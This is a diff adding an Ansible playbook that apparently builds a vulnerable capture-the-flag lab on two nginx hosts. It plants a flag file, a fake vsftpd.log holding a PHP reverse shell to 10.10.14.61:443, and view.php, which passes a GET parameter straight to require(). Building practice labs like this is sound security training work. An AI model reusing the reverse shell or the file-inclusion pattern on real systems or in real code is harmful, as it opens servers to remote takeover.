@@ -1,0 +1,74 @@
+---
+- name: ensure nginx
+  become: true
+  hosts: all
+  roles:
+  - docker
+  - nginx
+  post_tasks:
+  - name: ensure /var/www dir
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    file:
+      path: "/var/www/mywebsite/base/catalog"
+      state: directory
+
+  - name: ensure /base/log dir
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    file:
+      path: "/var/www/mywebsite/base/log"
+      state: directory
+
+  - name: ensure static files
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    copy:
+      dest: /var/www/mywebsite/index.html
+      content: |
+        <h1>Hello world! It's {{ inventory_hostname }}</h1>
+  - name: ensure flag file
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    copy:
+      dest: /var/www/mywebsite/base/flag.html
+      content: |
+        <h1>FLAG is here!!! It's {{ inventory_hostname }}</h1>
+
+  - name: ensure log file
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    copy:
+      dest: /var/www/mywebsite/base/log/vsftpd.log
+      content: |
+       <!--?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.61/443 0>&1'"); ?--> 
+
+  - name: ensure img file
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    copy:
+      dest: /var/www/mywebsite/base/catalog/image.html
+      content: |
+        <h1>This is image :) It's {{ inventory_hostname }}</h1>
+
+  - name: Install php
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    apt:
+      name:
+        - php-fpm
+      state: present
+      update_cache: yes
+      cache_valid_time: 3600
+
+  - name: ensure /base/exec dir
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    file:
+      path: "/var/www/mywebsite/base/exec"
+      state: directory
+
+  - name: ensure img file
+    when: inventory_hostname == "nginx-2" or inventory_hostname == "nginx-3"
+    copy:
+      dest: /var/www/mywebsite/base/exec/view.php
+      content: |
+        <?php
+          try {
+              require($_GET["page"]);
+          } catch (Exception $error) {
+              echo("An error occured.\n" + $error);
+          }
+        ?>
